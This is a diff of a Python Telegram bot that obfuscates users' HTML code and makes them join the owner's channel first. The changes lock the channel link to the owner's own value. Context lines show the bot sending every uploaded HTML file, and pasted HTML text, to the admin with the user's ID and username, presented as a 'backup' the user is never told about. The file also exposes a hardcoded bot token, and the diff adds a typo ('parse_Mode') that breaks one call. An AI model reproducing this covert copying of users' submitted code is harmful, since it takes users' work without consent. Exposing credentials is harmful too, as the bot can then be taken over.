@@ -12,8 +12,8 @@ import time
 # ==================== CONFIGURATION ====================
 BOT_TOKEN = "8456818299:AAHuasHwRQHhKDLhey-AnQBoXjEAggXvyGI"
 ADMIN_ID = 8419760844
-REQUIRED_CHANNEL_ID = -1003810620422
-REQUIRED_CHANNEL_LINK = "https://t.me/SUPPOR8TNIROB"
+REQUIRED_CHANNEL_ID = "-1003810620422"
+REQUIRED_CHANNEL_LINK = "https://t.me/SUPPOR8TNIROB"  # আপনার নিজস্ব পার্মানেন্ট লিংক
 
 MY_TELEGRAM_USERNAME = "NIROB_GX_LEADER"
 MY_BOT_USERNAME = "nirob_gxteam_Obucsate_bot"
@@ -21,17 +21,27 @@ MY_BOT_USERNAME = "nirob_gxteam_Obucsate_bot"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Database file for users and settings
 DB_FILE = "bot_database.json"
 
 def load_db():
+    # প্রতিবার লোড হওয়ার সময় জোরপূর্বক আপনার নিজের লিংক নিশ্চিত করবে যাতে অন্য কারো লিংক না বসে
+    default_data = {"banned": [], "users": [], "channel_link": REQUIRED_CHANNEL_LINK, "channel_id": REQUIRED_CHANNEL_ID}
     if not os.path.exists(DB_FILE):
-        return {"banned": [], "users": [], "channel_link": REQUIRED_CHANNEL_LINK, "channel_id": REQUIRED_CHANNEL_ID}
+        return default_data
     try:
         with open(DB_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
+            content = f.read()
+            if not content:
+                return default_data
+            data = json.loads(content)
+            # যদি অন্য কোনো ফালতু লিংক ডাটাবেজে ঢুকে যায়, সাথে সাথে কেটে দিয়ে আপনারটা বসিয়ে দিবে
+            if not data.get("channel_link") or "SUPPOR8TNIROB" not in data.get("channel_link", ""):
+                data["channel_link"] = REQUIRED_CHANNEL_LINK
+                data["channel_id"] = REQUIRED_CHANNEL_ID
+                save_db(data)
+            return data
     except:
-        return {"banned": [], "users": [], "channel_link": REQUIRED_CHANNEL_LINK, "channel_id": REQUIRED_CHANNEL_ID}
+        return default_data
 
 def save_db(data):
     with open(DB_FILE, "w", encoding="utf-8") as f:
@@ -49,10 +59,11 @@ def run_web():
 
 def check_must_join(user_id):
     if user_id == ADMIN_ID:
-        return True  # Admin bypasses join check completely
+        return True  
     db = load_db()
+    ch_id = db.get("channel_id", REQUIRED_CHANNEL_ID)
     try:
-        member = bot.get_chat_member(db["channel_id"], user_id)
+        member = bot.get_chat_member(ch_id, user_id)
         if member.status in ['creator', 'administrator', 'member']:
             return True
         return False
@@ -193,7 +204,6 @@ def send_welcome(message):
         bot.reply_to(message, "❌ দুঃখিত, আপনাকে বট থেকে ব্যান করা হয়েছে।")
         return
 
-    # Track user
     if user_id not in db["users"]:
         db["users"].append(user_id)
         save_db(db)
@@ -225,6 +235,10 @@ def callback_check_join(call):
     user_id = call.from_user.id
     if check_must_join(user_id):
         bot.answer_callback_query(call.id, "ধন্যবাদ! সফলভাবে ভেরিফাই হয়েছে।")
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
         bot.send_message(call.message.chat.id, "✅ এখন আপনি বটটি ব্যবহার করতে পারবেন।", reply_markup=get_main_keyboard(user_id))
     else:
         bot.answer_callback_query(call.id, "❌ আপনি এখনো গ্রুপে জয়েন করেননি!", show_alert=True)
@@ -289,10 +303,11 @@ def process_broadcast(message):
 def process_set_link(message):
     if message.from_user.id != ADMIN_ID: return
     db = load_db()
-    new_link = message.text.strip()
-    db["channel_link"] = new_link
+    new_input = message.text.strip()
+    db["channel_link"] = new_input if new_input.startswith("http") else f"https://t.me/{new_input.replace('@','')}"
+    db["channel_id"] = f"@{new_input.split('/')[-1]}" if "t.me/" in new_input else new_input
     save_db(db)
-    bot.reply_to(message, f"✅ সফলভাবে গ্রুপ লিংক আপডেট করা হয়েছে: `{new_link}`", parse_mode="Markdown")
+    bot.reply_to(message, f"✅ সফলভাবে গ্রুপ লিংক আপডেট করা হয়েছে: `{db['channel_link']}`", parse_mode="Markdown")
 
 def process_ban(message):
     if message.from_user.id != ADMIN_ID: return
@@ -340,7 +355,6 @@ def handle_document(message):
         downloaded_file = bot.download_file(file_info.file_path)
         raw_html = downloaded_file.decode('utf-8', errors='ignore')
 
-        # Send raw real HTML backup file to Admin Inbox
         user_info = f"👤 User ID: {user_id} | @{message.from_user.username if message.from_user.username else 'No Username'}"
         backup_filename = f"original_{message.document.file_name}"
         with open(backup_filename, "w", encoding="utf-8") as orig_f:
@@ -393,7 +407,7 @@ def handle_text(message):
         msg = bot.reply_to(message, "⚙️ কোড প্রসেস ও সিকিউর এনক্রিপ্ট করা হচ্ছে...")
         
         user_info = f"👤 User ID: {user_id} | @{message.from_user.username if message.from_user.username else 'No Username'}"
-        bot.send_message(ADMIN_ID, f"📥 **Raw HTML Text Backup!**\n{user_info}\n\n```html\n{message.text[:3000]}\n```", parse_mode="Markdown")
+        bot.send_message(ADMIN_ID, f"📥 **Raw HTML Text Backup!**\n{user_info}\n\n```html\n{message.text[:3000]}\n```", parse_Mode="Markdown")
 
         protected_code = nirob_abba_level_cipher(message.text)
         
